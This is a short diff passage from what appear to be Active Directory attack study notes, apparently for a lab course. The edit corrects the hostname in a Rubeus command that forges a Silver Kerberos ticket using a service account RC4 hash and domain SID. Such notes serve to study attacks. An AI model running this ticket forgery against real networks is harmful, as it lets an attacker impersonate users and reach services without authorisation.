@@ -386,7 +386,7 @@ Encrypted and Signed by the hash of the service account (Golden ticket is signed
 Forge a Silver ticket:
 ```
 C:\AD\Tools\Rubeus.exe silver
-/service:http/dcorpdc.dollarcorp.moneycorp.local
+/service:http/dcorp-dc.dollarcorp.moneycorp.local
 /rc4:6e58e06e07588123319fe02feeab775d 
 /sid:S-1-5-21-719815819-3726368948-3917688648
 /ldap
